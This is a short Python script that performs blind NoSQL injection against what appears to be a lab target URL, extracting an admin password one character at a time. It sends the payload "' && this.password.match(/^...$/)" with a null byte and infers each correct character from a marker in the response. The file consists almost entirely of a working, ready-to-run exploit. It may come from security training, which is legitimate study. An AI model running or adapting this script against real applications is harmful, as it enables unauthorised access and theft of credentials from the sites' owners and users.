#!/usr/bin/python3

import requests as req
import string
import time

begin = time.time()

url = "http://ptl-3e9e145d-8a9f7885.libcurl.st/?search=admin"
print("[+] Testing on URL - "+url)

sample="XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"
print("[+] Proposed Length - "+str(len(sample)))

print("[+] Performing Bruteforce...\n")
test_pass=''
while(True):
	for char in (string.ascii_lowercase + string.digits + '-'):
		payload="\'%20%26%26%20this.password.match(/^"+str(test_pass)+char+".*$/)%00"
	    	#print(char)
		test_url=url+payload
		r=req.get(test_url)
		print("\033[K"+"Building...", test_url, end="\r",)
		if b'href=\"?search=admin\">' in r.content:
			test_pass += char
		pass
	if len(test_pass)==len(sample):
	        break
end = time.time()
print(f"\n[+] Total runtime - {end - begin}")
print("\n[+] Retrieved password - "+test_pass)
